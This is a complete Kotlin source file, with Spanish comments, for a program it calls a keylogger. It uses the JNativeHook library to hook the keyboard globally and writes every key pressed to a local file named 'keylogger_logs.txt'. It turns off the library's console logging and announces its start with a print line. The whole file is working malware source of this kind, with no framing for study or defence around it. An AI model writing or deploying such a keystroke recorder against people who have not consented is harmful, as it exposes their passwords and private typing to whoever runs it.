import com.github.kwhat.jnativehook.GlobalScreen
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
import java.io.File
import java.util.logging.Level
import java.util.logging.Logger

class Keylogger : NativeKeyListener {

    private val logFile = File("keylogger_logs.txt")

    override fun nativeKeyPressed(e: NativeKeyEvent?) {
        e?.let {
            val keyText = NativeKeyEvent.getKeyText(it.keyCode)
            logKey(keyText)
        }
    }

    override fun nativeKeyReleased(e: NativeKeyEvent?) {
    }

    override fun nativeKeyTyped(e: NativeKeyEvent?) {
    }

    private fun logKey(key: String) {
        try {
            logFile.appendText("$key ")
        } catch (e: Exception) {
            println("Error al escribir en el archivo: ${e.message}")
        }
    }
}

fun main() {
    try {
        //desactiva los logs de la librería para evitar ruido en consola
        val logger = Logger.getLogger(GlobalScreen::class.java.packageName)
        logger.level = Level.OFF
        logger.useParentHandlers = false

        //hook global
        GlobalScreen.registerNativeHook()
        GlobalScreen.addNativeKeyListener(Keylogger())

        println("Keylogger iniciado. Presiona Ctrl+C para salir.")
    } catch (e: Exception) {
        println("Error al iniciar el keylogger: ${e.message}")
    }
}
